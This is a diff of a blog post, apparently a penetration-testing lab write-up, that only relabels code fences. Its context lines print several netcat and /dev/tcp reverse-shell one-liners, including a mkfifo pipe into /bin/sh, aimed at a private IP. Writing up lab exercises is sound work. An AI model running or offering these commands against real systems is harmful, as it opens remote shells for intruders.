@@ -20,7 +20,7 @@ I immediately found that netcat was installed, but ofcourse [without the e-optio
 
 The result looks like:
 
-```bash
+```console
 tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 10.11.0.49 443 1> /tmp/1
 ```
 
@@ -30,13 +30,13 @@ From many other options I found, none seemed to work. A quick test showed that t
 [/dev/tcp/&lt;ip&gt;/&lt;port&gt;](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) 
 did not work either. The following command did not result in any response on my machine.
 
-```bash
+```console
 echo foo > /dev/tcp/10.11.0.13/443
 ```
 
 Ofcourse, after having rooted the machine, I was still wondering whether other options found on the internet could work too. In my case I was able to execute multiple commands by separating them with a semicolon. This way a pipe is created first, followed by: netcat reading input from that pipe, netcat redirecting output to bash, bash redirecting stderr and stdout to the pipe again.
 
-```bash
+```console
 mkfifo pipe; nc -nv 10.11.0.13 443 < pipe | /bin/sh 2>pipe >pipe 
 ```
 
